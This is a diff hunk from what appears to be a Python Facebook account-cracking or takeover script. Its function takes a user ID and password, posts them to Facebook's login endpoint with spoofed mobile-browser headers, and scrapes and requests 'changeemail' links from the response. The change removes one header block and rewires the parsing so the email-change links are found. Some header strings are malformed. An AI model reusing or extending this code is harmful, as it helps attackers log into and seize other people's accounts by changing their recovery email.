@@ -1515,25 +1515,8 @@ def p(uid,pwx,tl):
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': '1026'}
             url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
-            headers = {
-            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-encoding': 'gzip, deflate',
-            'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"11.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '21',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; U; Android 9; en-us; GT-J768I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4471.60 Mobile Safari/537.36'}
-            for i in  re.findall('href="/changeemail(.*?)"',response.text):
+            result = requests.post(url, data=data, headers=headers)
+            for i in  re.findall('href="/changeemail(.*?)"',result.text):
                url="/changeemail"+i
             response = requests.get("https://m.facebook.com"+url, headers=headers)
             print(response)
